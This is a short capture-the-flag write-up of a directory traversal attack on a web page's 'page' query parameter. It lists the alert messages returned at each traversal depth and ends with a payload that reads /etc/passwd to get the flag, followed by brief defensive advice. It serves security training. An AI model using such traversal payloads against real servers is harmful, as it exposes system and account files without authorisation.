DIRECTORY TRAVERSAL

For the beginning, we used a lot the page to display based on the page parameters of the query string
So I got curious and tried a directory traversal attack

1. ?page=/helloworld
	If you put a page that doesnt exist, you get the alert message "Wtf ?"
2. ?page=../helloworld
	We also get the alert message "Wtf ?"
3. ?page=../../helloworld
	This time we get the alert message "Wrong.."
4. ?page=../../../helloworld
	This time we get the alert message "Nope.."
5. ?page=../../../../helloworld
	This time we get the alert message "Almost."
6. ?page=../../../../../helloworld
	This time we get the alert message "Still nope.."
7. ?page=../../../../../../helloworld
	This time we get the alert message "Nope.."
8. ?page=../../../../../../../helloworld
	This time we get the alert message "You can DO it !!!  :]"
		=> From here, we get the same alert message for each new rotation
Usually, you wanna find usernames in /etc/passwd doing such an attack, so let's try:
9. ?page=../../../../../../../etc/passwd
	We get the flag

PROTECTION
	Validate user input before processing
	Canonicalize the path and check that the absolute path starts as expected
